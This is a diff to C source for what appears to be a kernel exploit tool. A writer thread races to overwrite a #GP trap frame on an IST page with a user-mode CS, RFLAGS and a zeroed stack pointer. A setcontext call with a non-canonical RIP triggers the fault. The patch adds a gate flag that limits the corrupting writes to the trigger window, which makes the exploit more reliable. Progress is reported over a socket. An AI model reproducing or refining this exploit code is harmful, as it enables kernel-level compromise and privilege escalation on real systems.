@@ -77,6 +77,7 @@ static volatile sig_atomic_t probe_fault_occurred;
 
 /* Step 7: #GP trap frame method state */
 static volatile sig_atomic_t gp_trap_stop_writer;
+static volatile sig_atomic_t gp_trap_writer_active; /* gate: only write when set */
 static volatile sig_atomic_t gp_trap_got_result;
 static volatile uint64_t     gp_trap_doreti_addr;
 static volatile uint64_t     gp_trap_mc_cs;
@@ -2873,6 +2874,10 @@ gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
 {
     (void)info;
 
+    /* Immediately deactivate writer to avoid corrupting any
+     * subsequent exception's trap frame on the IST page. */
+    gp_trap_writer_active = 0;
+
     /* Snapshot IST page trap frame before kernel can clear it */
     if (gp_trap_ist_page_ptr) {
         gp_trap_ist_rip = *(volatile uint64_t *)(gp_trap_ist_page_ptr + 0xFD8);
@@ -2922,9 +2927,11 @@ gp_trap_writer_fn(void *arg)
     volatile uint32_t  *p_rsp_lo  = (volatile uint32_t  *)(ist_page + 0xFF0);
 
     while (!gp_trap_stop_writer) {
-        *p_cs     = 0x43;   /* user-mode CS selector */
-        *p_rflags = 0x202;  /* IF set, reserved bit 1 set */
-        *p_rsp_lo = 0;      /* zero low 32 bits of RSP */
+        if (gp_trap_writer_active) {
+            *p_cs     = 0x43;   /* user-mode CS selector */
+            *p_rflags = 0x202;  /* IF set, reserved bit 1 set */
+            *p_rsp_lo = 0;      /* zero low 32 bits of RSP */
+        }
     }
     return 0;
 }
@@ -4622,6 +4629,7 @@ broad_done:
         /* 7h. Start writer thread */
         send_response(sock, "\n7h. Starting writer thread...\n");
         gp_trap_stop_writer = 0;
+        gp_trap_writer_active = 0; /* only activate during trigger */
         gp_trap_got_result = 0;
         gp_trap_doreti_addr = 0;
 
@@ -4901,9 +4909,15 @@ broad_done:
                         "  attempt %d (non-canonical RIP)...\n",
                         (int)gp_trap_attempt_count);
 
+                    /* Activate writer just before trigger —
+                     * minimizes window where it can corrupt
+                     * unrelated exception trap frames. */
+                    gp_trap_writer_active = 1;
+
                     setcontext((ucontext_t *)uc_buf);
 
                     /* setcontext returned — failed */
+                    gp_trap_writer_active = 0;
                     send_response(sock,
                         "  setcontext returned! errno=%d\n", errno);
                     usleep(1000);
